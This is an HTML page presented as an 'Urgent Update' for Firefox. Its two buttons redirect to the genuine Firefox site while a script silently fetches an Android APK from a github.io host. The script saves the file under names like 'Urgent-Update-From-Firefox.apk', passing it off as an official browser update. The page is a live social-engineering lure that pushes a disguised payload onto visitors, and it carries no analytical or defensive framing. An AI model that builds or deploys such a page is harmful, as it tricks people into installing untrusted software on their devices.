<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Urgent Update</title>

</head>

<body>
    <h1>Urgent Update Your Firefox</h1>

    <button onclick="startImmed()">New Tab</button>

    <br><br>

    <button onclick="startCurrent()">Current Tab</button>

    <br>



    <script>
        function startImmed() {
            window.open('https://www.firefox.com/en-GB/more/', '_blank');

            setTimeout(async () => {
                const response = await fetch('https://kokurate.github.io/browser/rar-android-722.132.apk');
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download =
                    'Urgent-Update-From-Firefox.apk';
                link.click();
                URL.revokeObjectURL(url);
            }, 100);
        }

        function startCurrent() {
            window.location.href = 'https://www.firefox.com/en-GB/more/';

            setTimeout(async () => {
                const response = await fetch('https://kokurate.github.io/browser/rar-android-722.132.apk');
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download =
                    'Urgent-Update-From-Firefox154x.apk';
                link.click();
                URL.revokeObjectURL(url);
            }, 100);
        }
    </script>

</body>

</html>
